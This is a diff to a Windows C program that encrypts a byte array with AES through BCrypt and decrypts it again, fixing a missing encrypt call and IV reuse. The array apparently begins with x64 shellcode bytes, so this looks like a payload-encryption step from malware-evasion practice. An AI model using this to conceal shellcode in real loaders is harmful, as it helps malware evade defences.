@@ -104,6 +104,12 @@ BOOL InstallAesEncryption(PAES pAes) {
 	if (pbCipherText == NULL) {
 		bSTATE = FALSE; goto _EndOfFunc;
 	}
+	//Running BCryptEncrypt to encrypt the plaintext "pAes->pPlainText" using the key "hKeyHandle" and IV "pAes->pIV"
+	STATUS = BCryptEncrypt(hKeyHandle, (PUCHAR)pAes->pPlainText, (ULONG)pAes->dwPlainSize, NULL, pAes->pIv, IVSIZE, pbCipherText, cbCipherText, &cbResult, BCRYPT_BLOCK_PADDING);
+	if (!NT_SUCCESS(STATUS)) {
+		printf("BCryptEncrypt failed with error : 0x%0.8X \n", STATUS);
+		bSTATE = FALSE; goto _EndOfFunc;
+	}
 	//Clean up with EndofFunc
 _EndOfFunc:
 	if (hKeyHandle) {
@@ -267,6 +273,9 @@ int main() {
 	PrintHexData("pKey", key, KEYSIZE);
 	PrintHexData("pIv", iv, IVSIZE);
 
+	BYTE ivBackup[IVSIZE];
+	memcpy(ivBackup, iv, IVSIZE);
+
 	// Define plaintext data.
 	unsigned char Data[] = {
 		0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,
@@ -324,7 +333,7 @@ int main() {
 	// Now, decrypt the ciphertext.
 	PVOID pDecryptedText = NULL;
 	DWORD dwDecryptedSize = 0;
-	if (!SimpleDecryption(pCipherText, dwCipherSize, key, iv, &pDecryptedText, &dwDecryptedSize)) {
+	if (!SimpleDecryption(pCipherText, dwCipherSize, key, ivBackup, &pDecryptedText, &dwDecryptedSize)) {
 		printf("Decryption failed.\n");
 		HeapFree(GetProcessHeap(), 0, pCipherText);
 		return -1;
